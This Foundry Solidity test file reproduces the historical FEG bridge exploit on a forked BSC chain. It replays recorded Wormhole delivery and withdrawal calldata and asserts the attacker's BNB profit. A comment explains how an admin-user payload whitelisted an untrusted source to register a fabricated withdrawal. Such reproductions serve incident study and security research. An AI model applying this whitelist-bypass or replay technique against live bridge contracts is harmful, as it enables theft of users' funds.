// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$1M across Ethereum, Base, and BSC
    - Attacker: 0xCB96ddE53F43035f7395D8DbdB652987F7630b3c
    - Attack Contract: 0xe7ba8de3adf9d6cc12b8ceeb4a654ee1a276a03c
    - Vulnerable Relayer: 0x3A3709b8c67270A84Fe96291B7E384044160C6b1
    - Whitelist Delivery Tx: https://bscscan.com/tx/0x7e448bbf1566c20b6973d2cbdb49092d5c6fca90ad7f1a1fc4b102e8095899d2
    - Balance Delivery Tx: https://bscscan.com/tx/0x8d57aacd101b585ed5e68f9f5f79bea2082ec03862456615d9175d6c967289e4
    - Withdrawal Tx: https://bscscan.com/tx/0x3de4f3584203d7545b252df73a3b7e75db691a2c12467de42028552ca3bbf04f
    - Analysis: https://www.certik.com/resources/blog/feg-bridge-exploit-technical-analysis

    A bridged payload whose `user` was the configured admin could add its untrusted
    sourceAddress to the FEG relayer whitelist. A second payload from that source
    registered a fabricated 45.7B FEG withdrawal. The two real Wormhole delivery
    payloads and the historical withdrawal are replayed below.
*/

contract FEGBridgeExploitTest is Test {
    uint256 private constant FORK_BLOCK = 45_289_130;

    address private constant ATTACKER = 0xCB96ddE53F43035f7395D8DbdB652987F7630b3c;
    address private constant ATTACK_CONTRACT = 0xe7BA8DE3ADf9D6cc12B8cEEB4a654ee1a276A03c;
    address private constant WORMHOLE_RELAYER = 0x27428DD2d3DD32A4D7f7C497eAaa23130d894911;
    address private constant WHITELIST_DELIVERER = 0x6EbDeED7CA1A3761c9D94E2fe6F7F505fF0C9793;
    address private constant BALANCE_DELIVERER = 0x08416a15F64B47Cb8b5E7d15e7c077575e673cC9;

    uint256 private constant DELIVERY_VALUE = 476_190_476_000_000;
    uint256 private constant WITHDRAW_VALUE = 3_013_289_492_038_770;

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack contract");
        vm.label(WORMHOLE_RELAYER, "Wormhole relayer");
    }

    function testExploit() public {
        _replay(WHITELIST_DELIVERER, WORMHOLE_RELAYER, DELIVERY_VALUE, "src/test/2024-12/feg_whitelist_calldata.txt");
        _replay(BALANCE_DELIVERER, WORMHOLE_RELAYER, DELIVERY_VALUE, "src/test/2024-12/feg_balance_calldata.txt");

        vm.deal(ATTACKER, WITHDRAW_VALUE);
        uint256 attackerBefore = ATTACKER.balance;
        _replay(ATTACKER, ATTACK_CONTRACT, WITHDRAW_VALUE, "src/test/2024-12/feg_withdraw_calldata.txt");
        uint256 nativeProfit = ATTACKER.balance - attackerBefore;

        emit log_named_decimal_uint("BNB profit", nativeProfit, 18);
        assertGt(nativeProfit, 700 ether, "FEG bridge exploit did not reproduce");
    }

    function _replay(
        address sender,
        address target,
        uint256 value,
        string memory fixture
    ) private {
        vm.deal(sender, value);
        bytes memory data = vm.parseBytes(vm.readLine(fixture));

        vm.prank(sender, sender);
        (bool success, bytes memory returnData) = target.call{value: value}(data);
        if (!success) emit log_named_bytes("revert data", returnData);
        assertTrue(success, "historical FEG call reverted");
    }
}
